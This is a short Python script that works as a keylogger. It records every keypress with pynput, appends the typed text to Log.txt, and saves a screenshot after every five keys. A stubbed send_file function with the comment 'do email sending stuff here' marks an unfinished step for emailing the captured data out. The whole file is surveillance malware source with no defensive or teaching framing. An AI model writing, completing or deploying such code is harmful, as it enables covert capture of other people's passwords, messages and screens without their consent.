import pynput
import pyautogui, pathlib

from pynput.keyboard import Key, Listener

count = 0
keys = []
imgCount = 0

def screenshot():
    screenshot = pyautogui.screenshot("sc{0}.png".format(str(imgCount)))

def send_file(keys):
    pass
# do email sending stuff here

def on_press(key):
    global keys, count, imgCount

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 5:
        count = 0
        write_file(keys)
        imgCount += 1
        screenshot()
        #send_file(keys)
        keys = []

def write_file(keys):
    with open("Log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False; # stop program

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
